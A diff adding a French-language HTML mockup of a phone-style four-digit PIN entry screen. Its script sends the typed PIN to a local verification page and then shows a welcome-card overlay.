@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PIN Code Entry Screen</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        body > main {
+            border-radius: 15px;
+            background-color: #fff;
+            border: none;
+            width: 95%; /* Légère augmentation de la largeur */
+            max-width: 360px; /* Légère augmentation de la largeur maximale */
+            padding: 20px; /* Légère augmentation du padding */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .title-text {
+            color: #090909;
+            text-align: center;
+            font-size: 18px; /* Légère augmentation de la taille de la police */
+            font-weight: 700;
+            margin-bottom: 20px; /* Légère augmentation de la marge */
+        }
+
+        .pin-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px; /* Légère augmentation de l'espacement */
+            margin-bottom: 20px; /* Légère augmentation de la marge */
+        }
+
+        .pin-input {
+            width: 18px; /* Légère augmentation de la taille des points */
+            height: 18px; /* Légère augmentation de la taille des points */
+            max-width: none;
+            max-height: none;
+            background-color: #d9d9d9;
+            border-radius: 50%;
+        }
+
+        .pin-input.filled {
+            background-color: #000;
+        }
+
+        .forgot-password {
+            color: #4373d8;
+            font-size: 14px; /* Légère augmentation de la taille de la police */
+            text-decoration: none;
+            margin-bottom: 20px; /* Légère augmentation de la marge */
+        }
+
+        .home-indicator {
+            width: 80px; /* Légère augmentation de la largeur */
+            max-width: none;
+            height: 4px; /* Légère augmentation de la hauteur */
+            background-color: #000;
+            border-radius: 100px;
+        }
+
+        #welcome-card-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+
+        #welcome-card-iframe {
+            width: 90%;
+            height: 80%;
+            border: none;
+            border-radius: 15px;
+            background: #fff;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        @media (max-width: 360px) {
+            .title-text {
+                font-size: 16px;
+            }
+
+            .pin-input {
+                width: 12px;
+                height: 12px;
+            }
+
+            .forgot-password {
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main class="iphone-container">
+        <h1 class="title-text">Entrez le code secret de votre compte</h1>
+        <div class="pin-input-container">
+            <div class="pin-input"></div>
+            <div class="pin-input"></div>
+            <div class="pin-input"></div>
+            <div class="pin-input"></div>
+        </div>
+        <a href="#" class="forgot-password">Mot de passe oublié</a>
+        <footer class="home-indicator"></footer>
+    </main>
+
+    <div id="welcome-card-container">
+        <iframe id="welcome-card-iframe" src="welcome-card.html"></iframe>
+    </div>
+
+    <script>
+        const pinInputs = document.querySelectorAll('.pin-input');
+        let pin = '';
+        const maxPinLength = 4;
+        const welcomeCardContainer = document.getElementById('welcome-card-container');
+        let verificationInProgress = false;
+
+        document.addEventListener('keydown', function(event) {
+            const key = event.key;
+            if (!isNaN(parseInt(key)) && pin.length < maxPinLength) {
+                pin += key;
+                updatePinDisplay();
+                if (pin.length === maxPinLength && !verificationInProgress) {
+                    verifyPin();
+                }
+            } else if (key === 'Backspace') {
+                pin = pin.slice(0, -1);
+                updatePinDisplay();
+            }
+        });
+
+        function updatePinDisplay() {
+            pinInputs.forEach((dot, index) => {
+                dot.classList.toggle('filled', index < pin.length);
+            });
+        }
+
+        function verifyPin() {
+            verificationInProgress = true;
+            fetch('status-verification.html', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'pin=' + pin,
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Erreur de vérification');
+                return response.text();
+            })
+            .then(data => {
+                console.log('Vérification réussie:', data);
+                setTimeout(() => {
+                    welcomeCardContainer.style.display = 'flex';
+                    verificationInProgress = false;
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                pin = '';
+                updatePinDisplay();
+                verificationInProgress = false;
+                alert('Code PIN incorrect.');
+            });
+        }
+    </script>
+</body>
+</html>
